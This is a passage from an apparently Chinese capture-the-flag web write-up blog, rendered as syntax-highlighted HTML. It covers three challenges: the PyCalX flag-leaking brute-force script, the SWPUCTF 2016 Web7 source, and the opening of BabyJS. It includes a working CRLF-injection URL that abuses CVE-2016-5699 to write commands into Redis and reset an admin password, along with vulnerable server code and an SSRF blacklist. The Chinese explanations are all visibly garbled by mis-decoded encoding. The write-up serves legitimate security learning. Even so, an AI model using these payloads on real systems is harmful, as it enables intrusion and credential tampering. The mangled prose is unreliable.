&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">]):&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;T&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+f&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ru{FLAG&amp;lt;source or 14:x}&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">bin_search&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">flag&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªç”¨æŠŠä¸Šé¢çš„payloadç¨å¾®é­”æ”¹ä¸€ä¸‹å°±è¡Œï¼Œvalue1=T, op=+f, value2=re{Flag&amp;lt;source or 14:x}, source=xxxxï¼Œä¼ å‚çš„æ—¶å€™ä¸ç”¨åŠ å¼•å·ï¼Œå› ä¸ºå®ƒåœ¨é¢˜ç›®ä¸­è¿ç®—çš„æ—¶å€™ä¼šè‡ªå·±åŠ ä¸Šçš„&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xz.aliyun.com/t/2456">wp&lt;/a> | &lt;a href="https://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SWPUCTF 2016]Web7
&lt;/h4>
&lt;/summary>
&lt;p>robots.txtçš„æŠ¥é”™æ˜¾ç¤ºè¿™æ˜¯py2.7ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“cherrypy17.4.2ï¼Œé¦–é¡µæ˜¯è¾“å…¥æ¡†ï¼Œè¦æ±‚è¾“å…¥ä¸€ä¸ªurlï¼Œä¹‹åŽå¯ä»¥è¿”å›žå‘å‡ºè¯·æ±‚çš„ä¿¡æ¯ï¼Œä¸‹é¢è¿˜æœ‰ä¸€ä¸ªloginè¾“å…¥å¯†ç ç™»å…¥adminï¼Œæ— å¼±å£ä»¤&lt;/p>
&lt;p>çœ‹æºç çš„æ—¶å€™ç›´æŽ¥çœ‹åˆ°dockeräº†ï¼Œè€ƒç‚¹æ˜¯cve-2016-5699å’Œredis ssrf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#75715e"># coding:utf8&lt;/span>
&lt;span style="color:#111">__author__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;niexinming&amp;#39;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redis&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">web7&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt; window.location.href=&amp;#39;/input&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">input&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;é”™è¯¯&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?response?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">file&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectionPool&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">connection_pool&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;login.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t find admin:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;,fast fast fast.....&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?response?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">file&lt;/span>
&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.socket_host&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;server.socket_port&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">8080&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quickstart&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">web7&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨çš„urllib2.urlopenåº“åªæ”¯æŒhttp https ftp fileè¿™å‡ ç§schemaï¼Œä¸èƒ½ç”¨gopherï¼Œä½†æ˜¯æœ‰ä¸ªcveï¼ˆå’Œä¸Šå‘¨æžçš„nodejsçš„é‚£ä¸ªæœ‰ç‚¹åƒï¼‰ï¼Œå®ƒåœ¨å¤„ç†urlçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„httpå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211155739444.png" alt="image-20211211155739444">&lt;/p>
&lt;p>çœŸçš„è·Ÿnodejsé‚£ä¸ªå¾ˆåƒï¼Œnodeé‚£ä¸ªè¿˜å¤šä¸€ä¸ªä»‹è´¨ï¼ˆå¤„ç†unicodeå­—ç¬¦æ—¶è½¬åŒ–å‡ºé—®é¢˜ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å‘redisä¸­å†™å…¥è¾“å…¥æ”¹æŽ‰adminå¯†ç å°±è¡Œäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/amiz
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 åŠå†³èµ›]BabyJS
&lt;/h4>
&lt;/summary>
&lt;p>æ˜¯expressæ¡†æž¶ï¼Œcookieçš„sessionå­—æ®µåˆå§‹æ˜¯&lt;code>{&amp;quot;admin&amp;quot;:&amp;quot;no&amp;quot;}&lt;/code>ï¼Œæ”¹ä¸ºyesåŽè¿˜æ˜¯ä¼šé‡å®šå‘å›žæ¥ï¼›ç„¶åŽå‘çŽ°è‡ªå·±çœ¼çžŽæ²¡çœ‹è§é™„ä»¶ï¼Œæˆ‘çš„ï¼›è¯¦ç»†çš„è·¯ç”±ä»£ç åœ¨index.jsï¼Œçœ‹åˆ°blacklistå°±æœ‰SSRFçš„æ—¢è§†æ„Ÿäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../config&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">child_process&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;child_process&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;request&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Router&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1.xip.io&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;::ffff:127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;[::1]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;::1&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">({});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/debug&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">!=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// req.ipåœ¨é»‘åå•ä¸­
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;res&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[\&amp;#34;\&amp;#39;]/ig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">);&lt;/span>
